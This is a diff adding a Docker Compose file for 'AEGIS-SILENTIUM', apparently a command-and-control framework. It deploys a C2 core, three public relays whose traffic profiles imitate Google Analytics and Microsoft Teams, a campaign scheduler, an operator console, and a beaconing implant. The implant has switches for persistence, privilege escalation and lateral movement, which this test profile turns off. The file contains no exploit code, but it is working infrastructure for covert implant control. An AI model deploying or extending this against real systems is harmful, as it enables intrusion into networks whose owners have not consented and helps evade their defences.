@@ -1,0 +1,321 @@
+---
+# ═══════════════════════════════════════════════════════════════════════════════
+# AEGIS-SILENTIUM v1.0 — Full Docker Compose
+# ═══════════════════════════════════════════════════════════════════════════════
+# Services:
+#   postgres    — Encrypted Intelligence Core database
+#   core        — Intelligence Core (Flask API)
+#   relay1      — Stateless ECDHE relay (Go) — simulated public relay 1
+#   relay2      — Stateless ECDHE relay (Go) — simulated public relay 2
+#   relay3      — Stateless ECDHE relay (Go) — simulated public relay 3
+#   scheduler   — Campaign lifecycle manager
+#   dashboard   — Read-only operator console
+#   implant     — Example implant container (Python)
+#
+# Usage:
+#   # Generate TLS certs first
+#   bash scripts/gen_certs.sh
+#
+#   # Start full stack
+#   docker compose -f deployment/docker-compose.silentium.yml up -d
+#
+#   # Stop and remove
+#   docker compose -f deployment/docker-compose.silentium.yml down -v
+#
+# AUTHORIZED USE ONLY
+# ═══════════════════════════════════════════════════════════════════════════════
+
+version: "3.9"
+
+# ── Shared Networks ────────────────────────────────────────────────────────────
+networks:
+  # Public-facing network (relays only)
+  public_net:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 172.30.0.0/24
+
+  # Internal WireGuard-equivalent network (relays ↔ core, not public)
+  internal_net:
+    driver: bridge
+    internal: true
+    ipam:
+      config:
+        - subnet: 10.99.0.0/24
+
+  # Database network (core ↔ postgres only)
+  db_net:
+    driver: bridge
+    internal: true
+    ipam:
+      config:
+        - subnet: 10.99.1.0/24
+
+  # Dashboard network (dashboard ↔ core)
+  dash_net:
+    driver: bridge
+    internal: true
+    ipam:
+      config:
+        - subnet: 10.99.2.0/24
+
+# ── Shared Volumes ─────────────────────────────────────────────────────────────
+volumes:
+  postgres_data:
+    driver: local
+  certs:
+    driver: local
+  relay_profiles:
+    driver: local
+  core_logs:
+    driver: local
+  relay_logs:
+    driver: local
+
+# ── Services ──────────────────────────────────────────────────────────────────
+services:
+
+  # ── PostgreSQL (Intelligence Core DB) ───────────────────────────────────────
+  postgres:
+    image: postgres:16-alpine
+    container_name: aegis-postgres
+    restart: unless-stopped
+    environment:
+      POSTGRES_DB: aegis_silentium
+      POSTGRES_USER: aegis
+      POSTGRES_PASSWORD: ${DB_PASSWORD:-CHANGE_THIS_DB_PASSWORD}
+      POSTGRES_INITDB_ARGS: "--data-checksums"
+    volumes:
+      - postgres_data:/var/lib/postgresql/data
+      - ./deployment/init.sql:/docker-entrypoint-initdb.d/01-init.sql:ro
+    networks:
+      db_net:
+        ipv4_address: 10.99.1.10
+    # No external port exposure — DB accessible only on db_net
+    healthcheck:
+      test: ["CMD-SHELL", "pg_isready -U aegis -d aegis_silentium"]
+      interval: 10s
+      timeout: 5s
+      retries: 5
+    security_opt:
+      - no-new-privileges:true
+    read_only: false
+    tmpfs:
+      - /tmp
+      - /run/postgresql
+
+  # ── Intelligence Core ────────────────────────────────────────────────────────
+  core:
+    build:
+      context: .
+      dockerfile: c2/Dockerfile
+    image: aegis-silentium/core:5.0
+    container_name: aegis-core
+    restart: unless-stopped
+    depends_on:
+      postgres:
+        condition: service_healthy
+    environment:
+      DATABASE_URL: "postgresql://aegis:${DB_PASSWORD:-CHANGE_THIS_DB_PASSWORD}@10.99.1.10:5432/aegis_silentium"
+      AEGIS_OPERATOR_KEY: ${OPERATOR_KEY:-CHANGE_THIS_OPERATOR_KEY}
+      AEGIS_COLUMN_ENC_KEY: ${COLUMN_ENC_KEY:-CHANGE_THIS_32_BYTE_COLUMN_KEY}
+      FLASK_ENV: production
+      SECRET_KEY: ${SECRET_KEY:-CHANGE_THIS_SECRET_KEY}
+      # Relay mTLS client cert (core authenticates relays)
+      RELAY_CA_CERT: /certs/ca.pem
+    volumes:
+      - certs:/certs:ro
+      - core_logs:/var/log/aegis
+      - ./configs/silentium.conf:/etc/aegis/silentium.conf:ro
+    networks:
+      internal_net:
+        ipv4_address: 10.99.0.1
+      db_net:
+        ipv4_address: 10.99.1.2
+      dash_net:
+        ipv4_address: 10.99.2.1
+    expose:
+      - "5000"  # Core API — accessible only on internal_net and dash_net
+    healthcheck:
+      test: ["CMD", "curl", "-sf", "http://localhost:5000/health"]
+      interval: 15s
+      timeout: 5s
+      retries: 3
+    security_opt:
+      - no-new-privileges:true
+    read_only: false
+    tmpfs:
+      - /tmp
+
+  # ── Relay 1 (Go — public-facing) ─────────────────────────────────────────────
+  relay1:
+    build:
+      context: ./relay
+      dockerfile: Dockerfile
+    image: aegis-silentium/relay:5.0
+    container_name: aegis-relay1
+    restart: unless-stopped
+    depends_on:
+      core:
+        condition: service_healthy
+    environment:
+      RELAY_ID: relay1
+    volumes:
+      - certs:/certs:ro
+      - relay_profiles:/profiles:ro
+      - relay_logs:/var/log/aegis
+      - ./relay/profiles/default.yaml:/profiles/default.yaml:ro
+      - ./configs/relay1.yaml:/config/relay.yaml:ro
+    networks:
+      public_net:
+        ipv4_address: 172.30.0.10
+      internal_net:
+        ipv4_address: 10.99.0.2
+    ports:
+      - "443:443"   # Public TLS — change host port for multi-relay on same host
+    security_opt:
+      - no-new-privileges:true
+    read_only: true
+    tmpfs:
+      - /tmp
+
+  # ── Relay 2 ───────────────────────────────────────────────────────────────────
+  relay2:
+    build:
+      context: ./relay
+      dockerfile: Dockerfile
+    image: aegis-silentium/relay:5.0
+    container_name: aegis-relay2
+    restart: unless-stopped
+    depends_on:
+      core:
+        condition: service_healthy
+    volumes:
+      - certs:/certs:ro
+      - relay_profiles:/profiles:ro
+      - relay_logs:/var/log/aegis
+      - ./relay/profiles/google-analytics.yaml:/profiles/default.yaml:ro
+      - ./configs/relay2.yaml:/config/relay.yaml:ro
+    networks:
+      public_net:
+        ipv4_address: 172.30.0.11
+      internal_net:
+        ipv4_address: 10.99.0.3
+    ports:
+      - "8443:443"   # Second relay on different host port
+    security_opt:
+      - no-new-privileges:true
+    read_only: true
+    tmpfs:
+      - /tmp
+
+  # ── Relay 3 (Microsoft Teams profile) ────────────────────────────────────────
+  relay3:
+    build:
+      context: ./relay
+      dockerfile: Dockerfile
+    image: aegis-silentium/relay:5.0
+    container_name: aegis-relay3
+    restart: unless-stopped
+    depends_on:
+      core:
+        condition: service_healthy
+    volumes:
+      - certs:/certs:ro
+      - relay_profiles:/profiles:ro
+      - relay_logs:/var/log/aegis
+      - ./relay/profiles/microsoft-teams.yaml:/profiles/default.yaml:ro
+      - ./configs/relay3.yaml:/config/relay.yaml:ro
+    networks:
+      public_net:
+        ipv4_address: 172.30.0.12
+      internal_net:
+        ipv4_address: 10.99.0.4
+    ports:
+      - "9443:443"   # Third relay
+    security_opt:
+      - no-new-privileges:true
+    read_only: true
+    tmpfs:
+      - /tmp
+
+  # ── Scheduler ────────────────────────────────────────────────────────────────
+  scheduler:
+    build:
+      context: .
+      dockerfile: scheduler/Dockerfile
+    image: aegis-silentium/scheduler:5.0
+    container_name: aegis-scheduler
+    restart: unless-stopped
+    depends_on:
+      core:
+        condition: service_healthy
+    environment:
+      C2_URL: http://10.99.0.1:5000
+      AEGIS_OPERATOR_KEY: ${OPERATOR_KEY:-CHANGE_THIS_OPERATOR_KEY}
+    volumes:
+      - ./configs/silentium.conf:/etc/aegis/silentium.conf:ro
+    networks:
+      internal_net:
+        ipv4_address: 10.99.0.5
+    security_opt:
+      - no-new-privileges:true
+
+  # ── Dashboard (read-only operator console) ────────────────────────────────────
+  dashboard:
+    build:
+      context: .
+      dockerfile: dashboard/Dockerfile
+    image: aegis-silentium/dashboard:5.0
+    container_name: aegis-dashboard
+    restart: unless-stopped
+    depends_on:
+      core:
+        condition: service_healthy
+    environment:
+      C2_URL: http://10.99.2.1:5000
+      AEGIS_OPERATOR_KEY: ${OPERATOR_KEY:-CHANGE_THIS_OPERATOR_KEY}
+      DASHBOARD_CERT: /certs/dashboard.pem
+      DASHBOARD_KEY: /certs/dashboard_key.pem
+    volumes:
+      - certs:/certs:ro
+    networks:
+      dash_net:
+        ipv4_address: 10.99.2.10
+    ports:
+      - "127.0.0.1:7331:7331"   # Dashboard accessible only on localhost
+    security_opt:
+      - no-new-privileges:true
+
+  # ── Example Implant (for testing) ────────────────────────────────────────────
+  implant:
+    build:
+      context: .
+      dockerfile: node/Dockerfile
+    image: aegis-silentium/implant:5.0
+    container_name: silentium-implant-test
+    restart: "no"
+    depends_on:
+      - relay1
+    environment:
+      C2_URLS: "https://aegis-relay1:443"
+      NODE_ID: test-implant-001
+      BEACON_INTERVAL: "30"
+      SCAN_TARGET: "http://example.com"
+      TRUST_THRESHOLD: "10"   # Low threshold for test environment
+      # Disable all dangerous features in test
+      PERSISTENCE_ENABLED: "false"
+      PRIVESC_ENABLED: "false"
+      LATERAL_ENABLED: "false"
+      OPSEC_ENABLED: "false"
+    volumes:
+      - ./configs/silentium.conf:/etc/aegis/silentium.conf:ro
+      - ./relay/profiles/default.yaml:/etc/aegis/profiles/default.yaml:ro
+    networks:
+      public_net:
+        ipv4_address: 172.30.0.50
+    profiles:
+      - testing   # Only started when --profile testing is passed
+    security_opt:
+      - no-new-privileges:true
